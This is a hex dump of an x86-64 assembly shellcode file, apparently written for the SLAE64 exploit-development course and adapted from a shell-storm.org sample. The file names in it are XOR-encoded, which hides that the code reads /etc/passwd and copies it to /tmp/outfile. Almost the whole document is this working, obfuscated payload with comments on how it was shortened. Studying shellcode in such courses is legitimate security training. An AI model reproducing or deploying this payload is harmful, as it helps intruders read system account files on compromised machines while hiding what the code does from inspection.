00000000  3b 20 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |; ==============|
00000010  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000040  3d 3d 3d 3d 3d 0a 3b 20  4f 70 74 69 6d 69 7a 65  |=====.; Optimize|
00000050  64 20 76 65 72 73 69 6f  6e 20 6f 66 20 73 68 65  |d version of she|
00000060  6c 6c 63 6f 64 65 20 61  74 3a 0a 3b 20 68 74 74  |llcode at:.; htt|
00000070  70 3a 2f 2f 73 68 65 6c  6c 2d 73 74 6f 72 6d 2e  |p://shell-storm.|
00000080  6f 72 67 2f 73 68 65 6c  6c 63 6f 64 65 2f 66 69  |org/shellcode/fi|
00000090  6c 65 73 2f 73 68 65 6c  6c 63 6f 64 65 2d 38 36  |les/shellcode-86|
000000a0  37 2e 70 68 70 0a 3b 20  41 75 74 68 6f 72 3a 20  |7.php.; Author: |
000000b0  53 4c 41 45 36 34 2d 31  33 35 31 20 28 4b 65 79  |SLAE64-1351 (Key|
000000c0  6d 61 6e 29 0a 3b 20 44  61 74 65 3a 20 31 34 2f  |man).; Date: 14/|
000000d0  30 39 2f 32 30 31 34 0a  3b 0a 3b 20 4c 65 6e 67  |09/2014.;.; Leng|
000000e0  74 68 3a 20 31 30 35 20  62 79 74 65 73 20 28 67  |th: 105 bytes (g|
000000f0  6f 74 20 73 68 6f 72 74  65 72 20 62 79 20 31 33  |ot shorter by 13|
00000100  20 62 79 74 65 73 29 0a  3b 0a 3b 20 57 68 61 74  | bytes).;.; What|
00000110  27 73 20 6e 65 77 20 69  73 20 74 68 61 74 20 73  |'s new is that s|
00000120  6f 6d 65 20 6f 70 74 69  6d 61 6c 69 7a 61 74 69  |ome optimalizati|
00000130  6f 6e 20 77 61 73 20 70  65 72 66 6f 72 6d 65 64  |on was performed|
00000140  20 6f 6e 20 74 68 65 0a  3b 20 6f 72 69 67 69 6e  | on the.; origin|
00000150  61 6c 20 63 6f 64 65 20  77 68 69 63 68 20 6c 65  |al code which le|
00000160  66 74 20 73 6f 6d 65 20  73 70 61 63 65 20 74 6f  |ft some space to|
00000170  20 64 6f 20 61 20 62 61  73 69 63 20 64 65 63 6f  | do a basic deco|
00000180  64 69 6e 67 20 6f 66 20  74 68 65 0a 3b 20 66 69  |ding of the.; fi|
00000190  6c 65 20 6e 61 6d 65 73  2e 20 45 61 63 68 20 62  |le names. Each b|
000001a0  79 74 65 20 28 65 78 63  65 70 74 20 74 68 65 20  |yte (except the |
000001b0  66 69 72 73 74 20 6f 6e  65 29 20 77 61 73 20 78  |first one) was x|
000001c0  6f 72 27 65 64 20 77 69  74 68 20 74 68 65 0a 3b  |or'ed with the.;|
000001d0  20 76 61 6c 75 65 20 30  78 33 32 2e 20 54 68 65  | value 0x32. The|
000001e0  20 64 65 63 6f 64 65 72  20 70 61 72 74 20 78 6f  | decoder part xo|
000001f0  72 27 73 20 65 61 63 68  20 62 79 74 65 20 28 65  |r's each byte (e|
00000200  78 63 65 70 74 20 74 68  65 20 66 69 72 73 74 29  |xcept the first)|
00000210  0a 3b 20 77 69 74 68 20  74 68 69 73 20 76 65 72  |.; with this ver|
00000220  79 20 73 61 6d 65 20 76  61 6c 75 65 2e 0a 3b 0a  |y same value..;.|
00000230  3b 20 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |; ==============|
00000240  3d 3d 3d 3d 3d 3d 3d 3d  3d 3d 3d 3d 3d 3d 3d 3d  |================|
*
00000270  3d 3d 3d 3d 3d 0a 20 0a  73 65 63 74 69 6f 6e 20  |=====. .section |
00000280  2e 74 65 78 74 0a 67 6c  6f 62 61 6c 20 5f 73 74  |.text.global _st|
00000290  61 72 74 0a 20 0a 5f 73  74 61 72 74 3a 0a 20 20  |art. ._start:.  |
000002a0  20 20 20 20 20 20 78 6f  72 20 72 73 69 2c 20 72  |      xor rsi, r|
000002b0  73 69 0a 20 20 20 20 20  20 20 20 6a 6d 70 20 73  |si.        jmp s|
000002c0  74 72 69 6e 67 5f 31 0a  63 6f 6e 74 5f 31 3a 0a  |tring_1.cont_1:.|
000002d0  20 20 20 20 20 20 20 20  70 6f 70 20 72 64 69 0a  |        pop rdi.|
000002e0  20 0a 20 20 20 20 20 20  20 20 3b 20 64 65 63 6f  | .        ; deco|
000002f0  64 65 0a 20 0a 20 20 20  20 20 20 20 20 70 75 73  |de. .        pus|
00000300  68 20 32 34 0a 20 20 20  20 20 20 20 20 70 6f 70  |h 24.        pop|
00000310  20 72 63 78 0a 64 65 63  6f 64 65 3a 0a 20 20 20  | rcx.decode:.   |
00000320  20 20 20 20 20 78 6f 72  20 62 79 74 65 20 5b 72  |     xor byte [r|
00000330  64 69 2b 72 63 78 5d 2c  20 30 78 33 32 0a 20 20  |di+rcx], 0x32.  |
00000340  20 20 20 20 20 20 6c 6f  6f 70 20 64 65 63 6f 64  |      loop decod|
00000350  65 0a 20 20 20 20 20 0a  20 20 20 20 20 20 20 20  |e.     .        |
00000360  73 75 62 20 62 79 74 65  20 5b 72 64 69 2b 31 31  |sub byte [rdi+11|
00000370  5d 2c 20 30 78 34 31 20  20 20 20 20 20 20 20 20  |], 0x41         |
00000380  3b 20 73 65 74 20 6c 61  73 74 20 62 79 74 65 20  |; set last byte |
00000390  74 6f 20 30 78 30 30 0a  20 20 20 20 20 20 20 20  |to 0x00.        |
000003a0  73 75 62 20 62 79 74 65  20 5b 72 64 69 2b 32 34  |sub byte [rdi+24|
000003b0  5d 2c 20 30 78 34 31 20  20 20 20 20 20 20 20 20  |], 0x41         |
000003c0  3b 20 73 65 74 20 6c 61  73 74 20 62 79 74 65 20  |; set last byte |
000003d0  74 6f 20 30 78 30 30 0a  20 0a 20 20 20 20 20 20  |to 0x00. .      |
000003e0  20 20 3b 20 6f 70 65 6e  20 28 31 29 0a 20 0a 20  |  ; open (1). . |
000003f0  20 20 20 20 20 20 20 70  75 73 68 20 32 0a 20 20  |       push 2.  |
00000400  20 20 20 20 20 20 70 6f  70 20 72 61 78 0a 20 20  |      pop rax.  |
00000410  20 20 20 20 20 20 73 79  73 63 61 6c 6c 0a 20 0a  |      syscall. .|
00000420  20 20 20 20 20 20 20 20  70 75 73 68 20 72 61 78  |        push rax|
00000430  0a 20 20 20 20 20 20 20  20 70 6f 70 20 72 31 34  |.        pop r14|
00000440  20 20 20 20 20 20 20 20  20 20 20 20 20 3b 20 73  |             ; s|
00000450  6f 75 72 63 65 0a 20 0a  20 20 20 20 20 20 20 20  |ource. .        |
00000460  3b 20 6f 70 65 6e 20 28  32 29 0a 20 0a 20 20 20  |; open (2). .   |
00000470  20 20 20 20 20 61 64 64  20 72 64 69 2c 20 31 32  |     add rdi, 12|
00000480  0a 20 20 20 20 20 20 20  20 70 75 73 68 20 30 78  |.        push 0x|
00000490  36 36 0a 20 20 20 20 20  20 20 20 70 6f 70 20 72  |66.        pop r|
000004a0  73 69 0a 20 20 20 20 20  20 20 20 70 75 73 68 20  |si.        push |
000004b0  32 0a 20 20 20 20 20 20  20 20 70 6f 70 20 72 61  |2.        pop ra|
000004c0  78 0a 20 20 20 20 20 20  20 20 73 79 73 63 61 6c  |x.        syscal|
000004d0  6c 0a 20 0a 20 20 20 20  20 20 20 20 70 75 73 68  |l. .        push|
000004e0  20 72 61 78 0a 20 20 20  20 20 20 20 20 70 6f 70  | rax.        pop|
000004f0  20 72 31 35 20 20 20 20  20 20 20 20 20 20 20 20  | r15            |
00000500  20 3b 20 64 65 73 74 69  6e 61 74 69 6f 6e 0a 20  | ; destination. |
00000510  0a 20 20 20 20 20 20 20  20 3b 20 72 65 61 64 0a  |.        ; read.|
00000520  20 0a 20 20 20 20 20 20  20 20 78 6f 72 20 72 61  | .        xor ra|
00000530  78 2c 20 72 61 78 0a 20  20 20 20 20 20 20 20 70  |x, rax.        p|
00000540  75 73 68 20 72 31 34 0a  20 20 20 20 20 20 20 20  |ush r14.        |
00000550  70 6f 70 20 72 64 69 0a  20 20 20 20 20 20 20 20  |pop rdi.        |
00000560  70 75 73 68 20 72 73 70  0a 20 20 20 20 20 20 20  |push rsp.       |
00000570  20 70 6f 70 20 72 73 69  0a 20 20 20 20 20 20 20  | pop rsi.       |
00000580  20 6d 6f 76 20 64 78 2c  20 30 78 46 46 46 46 0a  | mov dx, 0xFFFF.|
00000590  20 20 20 20 20 20 20 20  73 79 73 63 61 6c 6c 0a  |        syscall.|
000005a0  20 0a 20 20 20 20 20 20  20 20 3b 20 77 72 69 74  | .        ; writ|
000005b0  65 0a 20 0a 20 20 20 20  20 20 20 20 70 75 73 68  |e. .        push|
000005c0  20 72 61 78 0a 20 20 20  20 20 20 20 20 70 6f 70  | rax.        pop|
000005d0  20 72 64 78 0a 20 0a 20  20 20 20 20 20 20 20 70  | rdx. .        p|
000005e0  75 73 68 20 72 31 35 0a  20 20 20 20 20 20 20 20  |ush r15.        |
000005f0  70 6f 70 20 72 64 69 0a  20 0a 20 20 20 20 20 20  |pop rdi. .      |
00000600  20 20 70 75 73 68 20 31  0a 20 20 20 20 20 20 20  |  push 1.       |
00000610  20 70 6f 70 20 72 61 78  0a 20 20 20 20 20 20 20  | pop rax.       |
00000620  20 73 79 73 63 61 6c 6c  0a 20 0a 20 20 20 20 20  | syscall. .     |
00000630  20 20 20 3b 20 65 78 69  74 0a 20 0a 20 20 20 20  |   ; exit. .    |
00000640  20 20 20 20 70 75 73 68  20 36 30 0a 20 20 20 20  |    push 60.    |
00000650  20 20 20 20 70 6f 70 20  72 61 78 0a 20 20 20 20  |    pop rax.    |
00000660  20 20 20 20 73 79 73 63  61 6c 6c 0a 20 0a 73 74  |    syscall. .st|
00000670  72 69 6e 67 5f 31 3a 0a  20 20 20 20 63 61 6c 6c  |ring_1:.    call|
00000680  20 63 6f 6e 74 5f 31 0a  20 20 20 20 3b 20 66 69  | cont_1.    ; fi|
00000690  72 73 74 20 62 79 74 65  20 73 74 61 79 73 20 74  |rst byte stays t|
000006a0  68 65 20 6f 72 69 67 69  6e 61 6c 20 76 61 6c 75  |he original valu|
000006b0  65 0a 20 20 20 20 73 5f  31 3a 20 64 62 20 30 78  |e.    s_1: db 0x|
000006c0  32 46 2c 20 30 78 35 37  2c 20 30 78 34 36 2c 20  |2F, 0x57, 0x46, |
000006d0  30 78 35 31 2c 20 30 78  31 44 2c 20 30 78 34 32  |0x51, 0x1D, 0x42|
000006e0  2c 20 30 78 35 33 2c 20  30 78 34 31 2c 20 30 78  |, 0x53, 0x41, 0x|
000006f0  34 31 2c 20 30 78 34 35  2c 20 30 78 35 36 2c 20  |41, 0x45, 0x56, |
00000700  30 78 37 33 2c 20 30 78  31 44 2c 20 30 78 34 36  |0x73, 0x1D, 0x46|
00000710  2c 20 30 78 35 46 2c 20  30 78 34 32 2c 20 30 78  |, 0x5F, 0x42, 0x|
00000720  31 44 2c 20 30 78 35 44  2c 20 30 78 34 37 2c 20  |1D, 0x5D, 0x47, |
00000730  30 78 34 36 2c 20 30 78  35 34 2c 20 30 78 35 42  |0x46, 0x54, 0x5B|
00000740  2c 20 30 78 35 45 2c 20  30 78 35 37 2c 20 30 78  |, 0x5E, 0x57, 0x|
00000750  37 33                                             |73|
00000752
